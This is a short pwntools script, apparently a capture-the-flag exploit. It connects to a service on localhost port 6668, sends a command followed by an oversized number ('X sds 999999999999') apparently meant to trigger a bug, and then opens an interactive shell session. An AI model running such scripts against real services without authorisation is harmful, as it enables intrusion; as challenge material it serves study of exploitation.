#!/usr/bin/python3
from pwn import *

client = remote("localhost",6668)
client.send(b'L TABLE CHAIR')
print(client.recv())
client.send(b'X sds 999999999999')
print(client.recv())
client.interactive()
